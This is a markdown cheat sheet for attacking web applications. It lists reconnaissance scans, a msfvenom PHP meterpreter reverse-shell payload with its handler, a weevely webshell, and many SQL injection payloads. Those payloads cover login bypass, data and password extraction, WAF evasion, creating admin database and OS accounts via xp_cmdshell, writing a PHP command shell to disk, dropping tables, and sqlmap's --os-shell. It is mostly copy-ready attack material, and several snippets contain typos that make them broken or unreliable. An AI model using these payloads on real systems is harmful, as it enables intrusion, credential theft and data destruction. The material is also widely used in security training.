## Hacking web cheat sheet

### Gathering web server

#### Finding default content of web server using nikto

```sh
nikto -h [HOST] -Tuning x
```

#### Analyze website using skipfish

```sh
skipfish -o /root/output -S /usr/share/skipfish/dictionaries/complete.wl [HOST:8080]
```

#### Discover web directories using uniscan

```sh
uniscan -u [HOST] -q
```

#### Discover robots.txt and sitemap.xml files using uniscan
```sh
uniscan -u [HOST] -we
```

#### Perform dynamic tests using uniscan
Obtains information about emails, source code disclosures, and external hosts.

```sh
uniscan -u [HOST] -d
```

#### Perform a port and service discovery scan using nmap

```sh
nmap -T4 -A -v [HOST]
```

#### Perform web application reconnaissance using WhatWeb
WhatWeb recognizes web technologies, such as blogging platforms, email addresses, content management systems (CMS), account IDs, statistics and analytics packages, JavaScript libraries, and embedded devices. It also identifies version numbers, web servers, web framework modules, etc.

```sh
whatweb [HOST]
```

```sh
whatweb -v [HOST]
```

#### Detect Load Balancers

```sh
dig [HOST]
```
```sh
lbd [HOST]
```

#### Enumerate server using nmap (applications, directories, and files)

```sh
nmap -sV --script http-enum [HOST]
```

#### Fast-paced enumeration of the hidden files and directories of the target web application using Gobuster

```sh
gobuster dir -u [HOST] -w [DICTIONARY]
```

### Attack website

```sh
wpscan --api-token [API Token] --url [HOST] --plugins-detection aggressive --enumerate vp
```

--enumerate vp: Specifies the enumeration of vulnerable plugins.

#### Create meterpreter php payload and encode using msfvenom

```sh
msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=4444 -f raw
```

Upload and open the file in the web server...

```sh
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST [IP Address of Host Machine]
set LPORT 4444
run
```

#### Webshell using weevely

```sh
weevely generate [PASSWORD] [FILE PATH]
```

Upload the shell to the web server...

```sh
weevely http://10.10.10.16:8080/dvwa/hackable/uploads/shell.php [PASSWORD]
```

### SQL Injection

#### Try to bypass website login forms

```sh
admin' --
```

```sh
admin' #
```

```sh
admin'/*
```

```sh
' or 1=1--
```

```sh
' or 1=1#
```

```sh
' or 1=1/*
```

```sh
') or '1'='1--
```

```sh
') or ('1'='1--
```

```sh
' UNION SELECT 1,'anotheruser','any password', 1--
```

#### Union

##### Extract data 

```sh
blah' UNION SELECT 0, username, password, 0 from users --
```

##### Extract database name

```sh
1 UNION SELECT ALL 1,DB_NAME,3,4--
```

##### Extract database tables

```sh
1 UNION SELECT ALL 1,TABLE_NAME,3,4 from sysobjects where xtype=char(85)--
```

##### Extract table column names

```sh
1 UNION SELECT ALL 1,column_name,3,4 form DB_NAME.information_schema.columns where table_name='EMPLOYEE_TABLE'--
```

##### Extract first field data

```sh
1 UNION SELECT ALL 1COLUMN-NAME-1,3,4 from EMPLOYEE_NAME --
```

#### Perform error based SQL Injection

##### Extract database name

```sh
1 or 1=convert(int,(DB_NAME))--
```

##### Extract first database table

```sh
1 or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))
```

##### Extract first table column name

```sh
1 or 1=convert(int, (select top 1 column_name from DBNAME.information_scherma.columns where table_name='TABLE-NAME-1'))--
```

##### Extract first field of first row

```sh
1 or 1=convert(int, (select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--
```

#### Extract database user

##### Check for username length

```sh
1; IF (KEN(USER)=1) WAITFOR DELAY '00:00:10'--
1; IF (KEN(USER)=2) WAITFOR DELAY '00:00:10'--
1; IF (KEN(USER)=3) WAITFOR DELAY '00:00:10'--
...
```

##### Check if first character in the username contains 'A' (a=97), 'B', or 'C' and so on

```sh
1; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:5'--
1; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:5'--
1; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:5'--
...
```

##### Check if second character in the username contains 'A' (a=97), 'B', or 'C' and so on

```sh
1; IF (ASCII(lower(substring((USER),2,1)))=97) WAITFOR DELAY '00:00:5'--
1; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:5'--
1; IF (ASCII(lower(substring((USER),2,1)))=99) WAITFOR DELAY '00:00:5'--
...
```

##### Check if third character in the username contains 'A' (a=97), 'B', or 'C' and so on

```sh
1; IF (ASCII(lower(substring((USER),3,1)))=97) WAITFOR DELAY '00:00:5'--
1; IF (ASCII(lower(substring((USER),3,1)))=98) WAITFOR DELAY '00:00:5'--
1; IF (ASCII(lower(substring((USER),3,1)))=99) WAITFOR DELAY '00:00:5'--
...
```

#### Bypass firewall

##### Normalization method

```sh
1/*union*/union/*select*/select+1,2,3/*
```
```sh
'/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/**/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'admin'--
```

###### Evading ' OR 1=1 signature

```sh
'OR 'john'='john'
```
```sh
'OR 8 > 4
```
```sh
'OR 5 BETWEEN 4 AND 6
```
```sh
'OR 'apple'='app'+'le'
```
```sh
'OR 'software like 'soft%''
```
```sh
'OR 'asd'>'a'
```
```sh
'OR 'movies'=N'movies'
```
```sh
'OR 'blabla' IN ('blabla')
```

##### Character enconding

###### Load files in unions (string="/etc/passwd")

```sh
' union select 1,(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
```

###### Inject without quotes (string = "%")
```sh
' or username like char(37)
```

###### Inject without quotes (string = "root")
```sh
' union select * from users where login = char(114,111,111,116);
```

###### Check for existing  files (string = "n.ext")
```sh
' and 1( if((load_file(char(110,46,101,120,116))<>char(39,39))1,0));
```


##### HPP technique
Override the HTTP GET/POST parameters by injecting delimiting characters into the query strings.

```sh
1;select+1&id=2,3+from+users+where+id=1--
```

##### HPF technique

```sh
1+union/*&b=*/select+1,2
1+union/*&b=*/select+1,pass/*&c=*/from+users--
```

##### Blind SQL Injection
Replace WAF signatures with their synonyms using SQL function.

```sh
1+OR=0x50=0x50
1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
```

##### String concatenation

###### MSSQL
```sh
'; EXEC ('DRO' + 'P T' + 'AB' + 'LE')
```

###### Oracle
```sh
'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
```

###### MySQL
```sh
'; EXECUTE CONCAT('INSE','RT US','ER')'
```

##### Manipulating white spaces

```sh
UNION        SELECT
```
```sh
'OR'1'='1'
```

##### Null byte

```sh
%00' UNION SELECT Password FROM Users WHERE UserName='admin'--'
```

##### Case variation

```sh
UnIoN SeLeCt PasSWord fRoM UsErS WhEre useRNAme='JoHn'
```

##### Declare variable

```sh
; declare @sqlvar nvarchar(70); set @sqlvar = (N'UNI' + N'ON' + N' SELECT' + N'Password'); EXEC(@sqlvar)
```



#### Exporting a value with regular expression attack

##### Exporting a value in MySQL

###### Check if first character in password is between 'a' and 'g'

```sh
2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-g]' AND ID=2)
```

###### Check if first character in password is between 'a' and 'h'

```sh
2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-h]' AND ID=2)
```

###### Check if first character in password is between 'd' and 'f'

```sh
2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d-f]' AND ID=2)
```

###### Check if first character in password is 'e'

```sh

2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[e]' AND ID=2)
```

##### Exporting a value in MSSQL

###### Check if second character in password is between 'a' and 'f'

```sh
2 and 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[a-f]%' AND ID=2)
```

###### Check if second character in password is between '0' and '9'

```sh
2 and 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[0-9]%' AND ID=2)
```

###### Check if second character in password is '4'

```sh
2 and 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[4]%' AND ID=2)
```

#### Creating database accounts

##### MySQL

```sh
INSERT INTO mysql.user (user, host, password) VALUES ('john', 'localhost', PASSWORD('toor'))
```

##### Microsoft Access

```sh
CREATE USER john IDENTIFIED BY 'toor'
```

##### Microsoft SQL Server

```sh
exec sp_addlogin 'john', 'toor'
exec sp_addsrvrolemember 'john', 'sysadmin'
```

##### Oracle

```sh
CREATE USER john IDENTIFIED BY toor TEMPORATY TABLESPACE temp DEFAULT TABLESPACE users;
GRANT CONNECT TO john;
GRANT RESOURCE TO john;
```

#### Interacting with the operating system

##### Creating OS accounts in MSSQL

###### Create user
```sh
';exec master..xp_cmdshell "net user john toor /add";--
```

###### Put new user into the administrators group

```sh
';exec master..xp_cmdshell "net localgroup administrators john /add";--
```

#### Interacting with the file system

##### Loading a file

```sh
NULL UNION ALL SELECT LOAD_FILE('/etc/password')/*
```

##### Writing a file
```sh
NULL UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system($_GET["command"]);?>' INTO OUTFILE '/var/www/custom_path/shell.php'/*
```

#### Manage data

##### MSSQL

###### Inserting a row

```sh
1';insert into users values ('john','toor'); --
```

###### Creating a database

```sh
1';create database mydatabase; -- 
```

###### Deleting a database

```sh
1'; DROP DATABASE mydatabase; -- 
```

###### Deleting a table

```sh
1'; DROP TABLE users; -- 
```

#### Using sqlmap

##### SQL Injection in a page using a cookie, retrieve databases

```sh
sqlmap -u "[HOST]" --cookie="[COOKIE]" --dbs
```
-u: Specifies the target URL.
 
--cookie: Specifies the HTTP cookie header value.

--dbs: Enumerates DBMS databases.

##### Choose a database and retrieve the tables

```sh
sqlmap -u "[HOST]" --cookie="[COOKIE]" -D [DATABASE] --tables
```

##### Retrieve the rows in a table

```sh
sqlmap -u "[HOST]" --cookie="[COOKIE]" -D [DATABASE] -T [TABLE] --dump
```

##### Getting a shell

```sh
sqlmap -u "[HOST]" --cookie="[COOKIE]" --os-shell
```

#### Using DSSS

##### SQL Injection in a page using a cookie, retrieve databases

```sh
python3 dsss.py -u "[HOST]" --cookie="[COOKIE]"
```
-u: Specifies the target URL.

--cookie: Specifies the HTTP cookie header value.


[<- Back to index](README.md)

---
## License

© 2021 [javierizquierdovera.com](https://javierizquierdovera.com)

Licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0) ([`LICENSE-APACHE`](LICENSE-APACHE)) or the [MIT license](https://opensource.org/licenses/MIT) ([`LICENSE-MIT`](LICENSE-MIT)), at your option.

`SPDX-License-Identifier: (Apache-2.0 OR MIT)`